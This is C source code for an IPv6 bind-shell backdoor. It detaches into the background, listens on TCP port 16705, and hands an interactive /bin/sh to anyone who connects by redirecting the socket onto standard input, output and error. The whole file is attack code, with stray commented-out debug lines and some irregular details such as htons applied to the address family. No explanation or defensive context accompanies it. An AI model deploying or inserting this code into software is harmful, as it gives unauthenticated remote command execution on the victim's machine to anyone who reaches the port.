#if 0
#include <sys/socket.h>
#include <string.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#endif
#define LOCAL_PORT 0x4141
#define IPPROTO_TCP 0
//#define IPPROTO_TCP 6
#define       INADDR_ANY              (unsigned int)0x00000000
#define IN6ADDR_ANY_INIT {{{ 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }}}
const struct in6_addr in6addr_any = IN6ADDR_ANY_INIT;

#define memset(addr, c, len) \
	int i = 0; \
	for(i = 0; i < len; i++) { \
		addr[i] = 0; \
	}

struct in6_addr any = IN6ADDR_ANY_INIT;


int main(void)
{
    char *cmd[] = {"/bin/sh", "-i", 0}; 
	struct sockaddr_in6 cli;
	struct sockaddr_in6 tcp;
	int sock = 0, sock_con = 0;
	unsigned int slen = sizeof(cli);
	unsigned char *ptr = (unsigned char *)&tcp;
	
	if (fork()) exit(0);

	//if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
	if ((sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP)) < 0) {
//		write(1,"ERROR1\n", 7);
		exit(-1);
	}
	int i = 0; 
	for(i = 0; i < sizeof(tcp); i++) { 
		ptr[i] = 0; 
	}
	tcp.sin6_family = htons(AF_INET6);
/*	ptr = (unsigned char *)&(tcp.sin6_addr);
	unsigned char *ptr2 = (unsigned char *)&any;

	for(i = 0; i < sizeof(tcp.sin6_addr); i++) { 
	write(1,"OK\n", 3);
		ptr[i] = ptr2[i]; 
	}
*/	
//	write(1, &in6addr_any, sizeof(in6addr_any));
//	tcp.sin6_addr = in6addr_any;
	tcp.sin6_port = htons(LOCAL_PORT);
	char one = 1;

//	write(1, &tcp, sizeof(tcp));
/*	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char *)&one, sizeof(int)) < 0)
		write(1,"ERROR2\n", 7);
*/
	if (bind(sock, (struct sockaddr *) &tcp, sizeof(tcp)) < 0) {
//		write(1,"ERROR3\n", 7);
		exit(-1);
	}

	if (listen(sock, 1) < 0) {
//		write(1,"ERROR4\n", 7);
		exit(-1);
	}
	while (1) {
		sock_con = accept(sock, (struct sockaddr *) &tcp, &slen);
/*		if (sock_con < 0) {
		write(1,"ERROR5\n", 7);
			exit(-1);
		}
*/		int pid = fork();
		if (pid) {
			//sleep(1);

			dup2(sock_con, 0);
			dup2(sock_con, 1);
			dup2(sock_con, 2);
	//		write(1, "CACA\n", 5);
			execve(*cmd, cmd, 0);
			exit(0);
		}
		close(sock_con);
		wait4(-1, NULL, 0, 0);
	}
	return 0;
}
